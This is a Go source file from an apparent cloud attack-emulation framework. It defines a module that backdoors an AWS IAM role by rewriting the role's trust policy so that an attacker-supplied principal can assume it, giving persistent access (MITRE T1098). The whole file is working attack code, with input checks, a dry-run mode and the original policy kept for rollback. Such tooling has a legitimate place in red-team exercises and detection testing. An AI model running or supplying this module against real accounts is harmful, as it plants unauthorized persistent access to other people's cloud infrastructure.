package module

import (
	"context"
	"encoding/json"
	"fmt"
	"net/url"

	"github.com/stratus-framework/stratus/internal/aws"
	sdk "github.com/stratus-framework/stratus/pkg/sdk/v1"
)

// IAMBackdoorRoleModule modifies a role's trust policy to add an attacker-controlled
// principal, enabling persistent access via role assumption. T1098.
type IAMBackdoorRoleModule struct {
	factory *aws.ClientFactory
}

func (m *IAMBackdoorRoleModule) Meta() sdk.ModuleMeta {
	return sdk.ModuleMeta{
		ID:          "com.stratus.iam.backdoor-role",
		Name:        "Backdoor IAM Role Trust Policy",
		Version:     "1.0.0",
		Description: "Modifies an IAM role's trust policy to add an attacker-controlled principal (ARN or account ID). This creates a persistence mechanism by allowing the specified principal to assume the target role. The original trust policy is preserved in the output for rollback.",
		Services:    []string{"iam"},
		RequiredActions: []string{
			"iam:GetRole",
			"iam:UpdateAssumeRolePolicy",
		},
		RequiredResources: []string{"arn:aws:iam::*:role/*"},
		RiskClass:         sdk.RiskDestructive,
		Inputs: []sdk.InputSpec{
			{Name: "role_name", Type: "string", Required: true, Description: "Name of the IAM role to backdoor"},
			{Name: "principal_arn", Type: "string", Required: true, Description: "ARN of the principal to add to trust policy (e.g., arn:aws:iam::123456789012:root)"},
		},
		Outputs: []sdk.OutputSpec{
			{Name: "role_name", Type: "string", Description: "The backdoored role"},
			{Name: "original_policy", Type: "string", Description: "Original trust policy (for rollback)"},
			{Name: "modified", Type: "bool", Description: "Whether the trust policy was modified"},
		},
		References: []string{
			"https://attack.mitre.org/techniques/T1098/",
		},
		Author:  "STRATUS Core",
		UIHints: sdk.UIHintSpec{Category: "IAM", SortOrder: 4},
	}
}

func (m *IAMBackdoorRoleModule) Preflight(ctx sdk.RunContext) sdk.PreflightResult {
	roleName := ctx.InputString("role_name")
	principalARN := ctx.InputString("principal_arn")
	if roleName == "" || principalARN == "" {
		return sdk.PreflightResult{
			MissingPermissions: []string{"(role_name and principal_arn inputs are required)"},
			PlannedAPICalls:    []string{"iam:GetRole", "iam:UpdateAssumeRolePolicy"},
			Confidence:         0.0,
		}
	}
	return sdk.PreflightResult{
		PlannedAPICalls: []string{"iam:GetRole", "iam:UpdateAssumeRolePolicy"},
		Confidence:      1.0,
		Warnings:        []string{"DESTRUCTIVE: This will modify the trust policy of an IAM role"},
	}
}

func (m *IAMBackdoorRoleModule) DryRun(ctx sdk.RunContext) sdk.DryRunResult {
	roleName := ctx.InputString("role_name")
	principalARN := ctx.InputString("principal_arn")
	return sdk.DryRunResult{
		Description: fmt.Sprintf("Would modify trust policy of role %q to add principal %q. Original policy preserved for rollback.", roleName, principalARN),
		WouldMutate: true,
		APICalls:    []string{"iam:GetRole", "iam:UpdateAssumeRolePolicy"},
	}
}

func (m *IAMBackdoorRoleModule) Run(ctx sdk.RunContext, prog sdk.Progress) sdk.RunResult {
	roleName := ctx.InputString("role_name")
	principalARN := ctx.InputString("principal_arn")

	if roleName == "" {
		return sdk.ErrResult(fmt.Errorf("role_name input is required"))
	}
	if principalARN == "" {
		return sdk.ErrResult(fmt.Errorf("principal_arn input is required"))
	}

	creds := aws.SessionCredentials{Region: ctx.Session.Region}
	bgCtx := context.Background()

	prog.Total(3)

	// Step 1: Get current trust policy
	prog.Update(1, "Retrieving current trust policy")
	detail, err := m.factory.GetIAMRoleDetail(bgCtx, creds, roleName)
	if err != nil {
		return sdk.ErrResult(fmt.Errorf("getting role detail: %w", err))
	}

	originalPolicy := detail.AssumeRolePolicyDoc
	decoded, err := url.QueryUnescape(originalPolicy)
	if err != nil {
		decoded = originalPolicy
	}

	// Step 2: Modify trust policy to add the attacker principal
	prog.Update(2, "Modifying trust policy")
	newPolicy, err := addPrincipalToTrustPolicy(decoded, principalARN)
	if err != nil {
		return sdk.ErrResult(fmt.Errorf("modifying trust policy: %w", err))
	}

	// Step 3: Apply the modified trust policy
	prog.Update(3, "Applying modified trust policy")
	err = m.factory.UpdateAssumeRolePolicy(bgCtx, creds, roleName, newPolicy)
	if err != nil {
		return sdk.ErrResult(fmt.Errorf("updating trust policy: %w", err))
	}

	return sdk.RunResult{
		Outputs: map[string]any{
			"role_name":       roleName,
			"original_policy": decoded,
			"modified":        true,
		},
	}
}

func (m *IAMBackdoorRoleModule) Replay(ctx sdk.RunContext, prior sdk.PriorRunRecord) sdk.RunResult {
	return sdk.RunResult{Outputs: prior.Outputs}
}

// addPrincipalToTrustPolicy adds a new principal to an existing trust policy.
func addPrincipalToTrustPolicy(policyJSON, newPrincipal string) (string, error) {
	var doc map[string]interface{}
	if err := json.Unmarshal([]byte(policyJSON), &doc); err != nil {
		return "", fmt.Errorf("parsing trust policy: %w", err)
	}

	statementsRaw, ok := doc["Statement"]
	if !ok {
		return "", fmt.Errorf("trust policy has no Statement")
	}

	statements, ok := statementsRaw.([]interface{})
	if !ok {
		return "", fmt.Errorf("Statement is not an array")
	}

	// Add new statement for the attacker principal
	newStatement := map[string]interface{}{
		"Effect": "Allow",
		"Principal": map[string]interface{}{
			"AWS": newPrincipal,
		},
		"Action": "sts:AssumeRole",
	}

	doc["Statement"] = append(statements, newStatement)

	result, err := json.Marshal(doc)
	if err != nil {
		return "", fmt.Errorf("marshaling modified policy: %w", err)
	}

	return string(result), nil
}
